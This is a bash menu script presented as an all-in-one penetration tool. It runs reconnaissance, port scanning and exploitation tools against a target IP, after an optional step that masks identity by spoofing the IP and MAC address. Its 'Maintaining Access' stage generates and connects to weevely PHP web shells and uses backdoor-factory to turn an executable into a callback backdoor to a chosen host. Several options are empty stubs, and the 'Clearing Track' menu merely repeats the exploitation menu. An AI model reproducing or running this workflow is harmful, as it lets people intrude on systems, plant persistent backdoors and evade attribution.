#!/bin/bash
clear

echo "Welcome to Virtuoso! Created by Johnny"
echo ""
echo "____   ____.__         __                            "
echo "\   \ /   /|__|_______/  |_ __ __  ____  __________  "
echo " \   Y   / |  \_  __ \   __\  |  \/  _ \/  ___/  _ \ "
echo "  \     /  |  ||  | \/|  | |  |  (  <_> )___ (  <_> )"
echo "   \___/   |__||__|   |__| |____/ \____/____  >____/ "
echo "                                            \/       "
echo ""
echo "PLEASE RUN WITH SYSTEM PRIVILEGE"
echo ""
echo "ENSURE YOU HAVE PERMISSION BEFORE USING THE TOOL!"
echo "WE ARE NOT RESPONSIBLE ON HOW THIS TOOL IS USED!"
echo ""
echo "All in one penetration tool for penetration testing!"
echo "Please enter your target IP address"
echo "Please input one IP address ONLY!" 
read -p 'Target IP Address> ' ip
ifconfig | grep "mtu" | cut -d":" -f 1
echo "Please type in the interface name:"
read -p "interface> " interface


IFS='.' read -r -a array <<< "$ip"

if [ ${#array[@]} -eq 4 ]
then
	for element in "${array[@]}"
	do
		
   		if [[ $element -lt 0 ]] || [[ $element -gt 255 ]]
		then
			echo "IP Address Error, try again!"
			exit 0
	
		fi
	
	done
else
	echo "Sorry the IP address is Invalid!"
	exit 0
fi

echo "Please enter the interface"

proxychains="n"
echo "Masking your identity"
echo "Your current Public IP address"
curl https://api.ipify.org
echo ""
echo "Your current Private IP address"
ifconfig | grep "inet" | cut -d":" -f 2   
echo "Would you like to mask your identity?[y/n]"
read option
if [ $option == "y" ]
then
	while :
	do
		echo "[1] proxychains (Ensure you have it configured!)"
		echo "[2] ip changer (host only!)"
		echo "[3] macchangr (host only!)"
		echo "[4] Skip to Reconnaissance"
		echo "[5] Quit"
	read -p 'Virtuoso> ' option

	case $option in 
                1)
		echo "Proxychains Selected"
		echo "All command from now onwards will run with Proxychains!"
		proxychains="y"
		echo "Would you like to continue or do another option? [y/n]"
		read option
		if [ $option == 'n' ]
		then
			break
		fi
		;;
     	2)
		echo "ip changer Selected"
		echo "Please type in the spoofed IP address:"
		read -p "spoofed ip address> " ip
		ifconfig $interface $ip
		echo "Please confirm your changes:"
		ifconfig | grep "inet" | cut -d":" -f 2  
		echo "Would you like to continue or do another option? [y/n]"
        	read option
        	if [ $option == 'n' ]
        	then
                	break
        	fi
		;;
     	3)
		echo "macchanger Selected"
	
		ifconfig | grep "ether" 
                echo "Randomizing MAC address"
		ifconfig $interface down
                macchanger -r $interface
		ifconfig $interface up
                echo "Please confirm your changes:"
                ifconfig | grep "ether" 
		echo "Would you like to continue or do another option? [y/n]"
        	read option
        	if [ $option == 'n' ]
        	then
                	break
        	fi
		;;
        4)
		break
		;;
     	5)
		echo "Quiting Now"
		exit 0
		;;
	esac

	done
fi	



while :
do
echo "Now to the reconnaissance phase"
echo "[1] Whois"
echo "[2] dig"
echo "[3] theHarvester"
echo "[4] Skip to Scanning"
echo "[5] Quit"
read -p 'Virtuoso> ' option

case $option in 
     1)
	echo "Whois Selected"
	echo "Running Whois Now"
	if [ $proxychains == "y" ]
	then
		proxychains whois $ip
	else 
		whois $ip
	fi
	echo "Would you like to continue or do another recon? [y/n]"
	read option
	if [ $option == 'n' ]
	then
		break
	fi
	;;

     2)
	echo "dig Selected"
	echo "Running dig Now"
	dig $ip
	echo "Would you like to continue or do another recon? [y/n]"
        read option
        if [ $option == 'n' ]
        then
                break
        fi
	;;
     3)
	echo "theHarvester Selected (Only Google)"
	echo "Running theHarvester"
	if [ $proxychains == "y" ]
        then
                proxychains theharvester -d $ip -b google
        else 
                theharvester -d $ip -b google
        fi
	echo "Would you like to continue or do another recon? [y/n]"
        read option
        if [ $option == 'n' ]
        then
                break
        fi
	;;
     4)
	break
	;;
     5)
	echo "Quiting Now"
	exit 0
	;;
esac

done

while :
do
echo "Now to the scanning phase"
echo "[1] nmap"
echo "[2] netdiscover"
echo "[3] masscan (For large network)"
echo "[4] owasp zap"
echo "[5] Metasploit Auxiliary Module (msfconsole)"
echo "[6] Skip to Exploitation"
echo "[7] Quit"
read -p 'Virtuoso> ' option

case $option in 
     1)
	echo "nmap Selected"
	echo "It will find the OS and services running"
	echo "What is the IP address and the range (192.168.0.0/24)"
	read -p"ipaddress> " ipaddr
	echo "What is the scan that you would like to perform (sT)"
	read -p"Type> " type
	echo "What is the intensity of Scan?(1-5)"
	read -p"Intensity> " intensity
	if [ "$proxychains" == "y" ]
        then
                proxychains nmap -$type -T $intensity -e $interface -O -sV $ipaddr
        else 
                nmap -$type -T $intensity -e $interface -O -sV $ipaddr
        fi

	echo "Would you like to continue or do another recon? [y/n]"
	read option
	if [ $option == 'n' ]
	then
		break
	fi
	;;
     2)
	echo "netdiscover Selected"
	echo "Please put in the IP address range (192.168.0.0/24)"
	read -p"IP Range> " range
	echo "Running netdiscover Now"
	echo "Opening in a new Terminal"
        gnome-terminal -- netdiscover -r $range
	echo "Would you like to continue or do another recon? [y/n]"
        read option
        if [ $option == 'n' ]
        then
                break
        fi
	;;
     3)
	echo "masscan Selected"
	echo "Please put in the IP address range (192.168.0.0/24)"
	read -p"IP Range> " range
	echo "Please put in the port to scan"
	read -p"Port> " port
	echo "Running masscan"
	if [ $proxychains == "y" ]
        then
                proxychains masscan -p $port --interface $interface  $range 
        else 
                masscan -p  $port --interface $interface $range
        fi

	echo "Would you like to continue or do another recon? [y/n]"
        read option
        if [ $option == 'n' ]
        then
                break
        fi
	;;
     4)
	echo "Owasp-zap Selected!"
	echo "Running Owasp-zap"
	owasp-zap
	echo "Would you like to continue or do another recon? [y/n]"
        read option
        if [ $option == 'n' ]
        then
                break
        fi
	;;
     5)
	echo "Starting MSFConsole"
 	service postgresql start
	gnome-terminal -- msfconsole
        echo "Would you like to continue or do another recon? [y/n]"
        read option
        if [ $option == 'n' ]
        then
                break
        fi
        ;;
     6)
	break
	;;
     7)
	echo "Quiting Now"
	exit 0
	;;
esac
done

while :
do
echo "Now to the Exploitation phase"
echo "[1] metasploit (msfconsole)"
echo "[2] armitage"
echo "[3] beef xss"
echo "[4] sqlmap"
echo "[5] Skip to Scanning"
echo "[6] Quit"
read -p 'Virtuoso> ' option

case $option in 
     1)
	echo "metasploit Selected"
	echo "metasploit with proxychains is currently unavailable."
	echo "Starting MSFConsole"
        service postgresql start
        gnome-terminal -- msfconsole
	echo "Would you like to continue or do another exploitation? [y/n]"
	read option
	if [ $option == 'n' ]
	then
		break
	fi
	;;
     2)
	echo "armitage running"
	armitage
	echo "Would you like to continue or do another exploitation? [y/n]"
        read option
        if [ $option == 'n' ]
        then
                break
        fi
        ;;
     3)
        echo "beef xss running"
	echo "Please wait for a moment while beef is setting up"
	echo "A browser will open soon!"
	echo ""
        beef-xss
        echo "Would you like to continue or do another exploitation? [y/n]"
        read option
        if [ $option == 'n' ]
        then
                break
        fi
        ;;
     4)
        echo "sqlmap running"
        gnome-terminal -- sqlmap
        echo "Would you like to continue or do another exploitation? [y/n]"
        read option
        if [ $option == 'n' ]
        then
                break
        fi
        ;;
     5)
	break
	;;
     6)
	echo "Quiting Now"
	exit 0
	;;
esac

done


while :
do
echo "Now to the Maintaining Access phase"
echo "[1] weevely (PHP Application)"
echo "[2] backdoor factory"
echo "[3] webacoo"
echo "[4] msfvenom"
echo "[5] Skip to Scanning"
echo "[6] Quit"
read -p 'Virtuoso> ' option

case $option in 
     1)
	echo "weevely Selected"
	echo "[1] Generate a PHP payload"
	echo "[2] Connect to the target"
	read -p"Option> " choice
	if [ $choice -eq 1 ]
	then
		read -p"Payload Name> " name
		read -p"Password> " password
		echo "Payload will be generated where this script is"
		weevely generate $password /$name.php
	else
		read -p"Website> " website
		read -p"Password> " password
		echo "Establishing a connection..."
		weevely $website $password
	fi
	echo "Would you like to continue or do another exploitation? [y/n]"
	read option
	if [ $option == 'n' ]
	then
		break
	fi
	;;
     2)
	echo "backdoor factory running"
	echo "Please specify the path to your executable"
	read -p"Path> " path
	echo "Now listing all the exploit..."
	backdoor-factory -f $path -s show
	echo "Please choose the exploit"
	read -p"exploit> " exploit
	echo "Please specify the host IP address"
	read -p"Host IP> " hIP
	echo "Please specify the host PORT"
	read -p"Host Port> " hPort
	backdoor-factory -f $path -H $hIP -P $hPort -s $exploit
	echo "Would you like to continue or do another exploitation? [y/n]"
        read option
        if [ $option == 'n' ]
        then
                break
        fi
        ;;
     3)
        echo "webacoo running"
	
        echo "Would you like to continue or do another exploitation? [y/n]"
        read option
        if [ $option == 'n' ]
        then
                break
        fi
        ;;
     4)
        echo "msfvenom running"
        
        echo "Would you like to continue or do another exploitation? [y/n]"
        read option
        if [ $option == 'n' ]
        then
                break
        fi
        ;;
     5)
	break
	;;
     6)
	echo "Quiting Now"
	exit 0
	;;
esac

done

while :
do
echo "Now to the Clearing Track phase"
echo "[1] metasploit"
echo "[2] armitage"
echo "[3] beef xss"
echo "[4] sqlmap"
echo "[5] Skip to Scanning"
echo "[6] Quit"
read -p 'Virtuoso> ' option

case $option in 
     1)
	echo "metasploit Selected"
	echo "metasploit with proxychains is currently unavailable."
	echo "What is the exploit you would like to search?"
	read -p "Exploit name> "
	
	echo "Would you like to continue or do another exploitation? [y/n]"
	read option
	if [ $option == 'n' ]
	then
		break
	fi
	;;
     2)
	echo "armitage running"
	armitage
	echo "Would you like to continue or do another exploitation? [y/n]"
        read option
        if [ $option == 'n' ]
        then
                break
        fi
        ;;
     3)
        echo "beef xss running"
	echo "Please wait for a moment while beef is setting up"
	echo "A browser will open soon!"
	echo ""
        beef-xss
        echo "Would you like to continue or do another exploitation? [y/n]"
        read option
        if [ $option == 'n' ]
        then
                break
        fi
        ;;
     4)
        echo "sqlmap running"
        gnome-terminal -- sqlmap
        echo "Would you like to continue or do another exploitation? [y/n]"
        read option
        if [ $option == 'n' ]
        then
                break
        fi
        ;;
     5)
	break
	;;
     6)
	echo "Quiting Now"
	exit 0
	;;
esac

done




